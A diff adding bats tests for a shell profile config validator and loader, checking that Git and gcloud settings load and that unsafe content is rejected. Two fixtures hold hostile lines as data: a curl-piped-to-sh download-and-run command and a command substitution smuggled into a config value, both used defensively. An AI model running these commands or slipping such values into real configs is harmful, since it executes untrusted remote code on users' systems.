@@ -171,9 +171,75 @@ EOF
     assert_failure
 }
 
+@test "_profile_validate_config_file: rejects curl piped to sh" {
+    local config_file="$TEST_DIR/dangerous.conf"
+    cat > "$config_file" << 'EOF'
+curl http://192.0.2.1/x | sh
+EOF
+    run _profile_validate_config_file "$config_file"
+    assert_failure
+}
+
 @test "_profile_validate_config_file: rejects a missing file" {
     run _profile_validate_config_file "$TEST_DIR/nonexistent.conf"
     assert_failure
+}
+
+# ============================================
+# _profile_load_conf_file
+# ============================================
+
+@test "_profile_load_conf_file: loads scalar KEY=value assignments" {
+    local config_file="$TEST_DIR/load.conf"
+    cat > "$config_file" << 'EOF'
+# comment
+GIT_NAME="Test User"
+GIT_EMAIL='test@example.com'
+GIT_GPG_FORMAT=ssh
+EOF
+    unset GIT_NAME GIT_EMAIL GIT_GPG_FORMAT
+    _profile_load_conf_file "$config_file"
+    [ "$GIT_NAME" = "Test User" ]
+    [ "$GIT_EMAIL" = "test@example.com" ]
+    [ "$GIT_GPG_FORMAT" = "ssh" ]
+}
+
+@test "_profile_load_conf_file: loads GCLOUD_PROJECTS array entries" {
+    local config_file="$TEST_DIR/gcloud-load.conf"
+    cat > "$config_file" << 'EOF'
+GCLOUD_ACCOUNT="jane@example.com"
+GCLOUD_PROJECTS=(
+    "proj-a|Project A"
+    "proj-b|Project B"
+)
+EOF
+    unset GCLOUD_ACCOUNT
+    GCLOUD_PROJECTS=()
+    _profile_load_conf_file "$config_file"
+    [ "$GCLOUD_ACCOUNT" = "jane@example.com" ]
+    [ "${#GCLOUD_PROJECTS[@]}" -eq 2 ]
+    [ "${GCLOUD_PROJECTS[0]}" = "proj-a|Project A" ]
+    [ "${GCLOUD_PROJECTS[1]}" = "proj-b|Project B" ]
+}
+
+@test "_profile_load_conf_file: rejects command substitution in a value" {
+    local config_file="$TEST_DIR/bad-sub.conf"
+    cat > "$config_file" << 'EOF'
+GIT_NAME="$(curl http://192.0.2.1/x)"
+EOF
+    run _profile_load_conf_file "$config_file"
+    assert_failure
+}
+
+@test "_profile_load_conf_file: dry validate does not apply assignments" {
+    local config_file="$TEST_DIR/dry.conf"
+    cat > "$config_file" << 'EOF'
+GIT_NAME="Should Not Stick"
+EOF
+    unset GIT_NAME
+    run _profile_validate_config_file "$config_file"
+    assert_success
+    [ -z "${GIT_NAME:-}" ]
 }
 
 # ============================================
